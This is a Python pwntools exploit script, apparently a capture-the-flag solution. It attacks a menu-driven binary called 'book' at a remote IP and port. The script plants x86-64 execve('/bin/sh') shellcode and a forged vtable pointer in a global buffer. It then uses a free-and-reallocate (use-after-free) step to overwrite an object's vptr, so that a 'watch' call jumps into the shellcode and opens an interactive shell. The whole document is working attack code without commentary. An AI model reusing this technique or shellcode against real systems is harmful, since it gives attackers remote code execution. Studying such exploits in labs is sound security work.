from pwn import *

#r = process('./book')
r = remote('10.10.202.172',22233)
sc = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

def addMath(name,price):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(name)
    r.recvuntil(":")
    r.sendline(str(price))

def remove(idx):
    r.recvuntil(":")
    r.sendline("5")
    r.recvuntil(":")
    r.sendline(str(idx))

def watch(idx):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))

name = 0x4083c0
vptr = name + 8
r.recvuntil(":")
r.sendline("a"*8 + p64(vptr) + sc)# write the evil vptr and the shellcode on the bss
addMath("a"*8,25)
addMath("b"*8,26)
#gdb.attach(r)
remove(0)
#gdb.attach(r)
addMath("a"*(8*11) + p64(vptr),2)# jump to the bss and run the shellcode
#gdb.attach(r)
watch(0)

r.interactive()
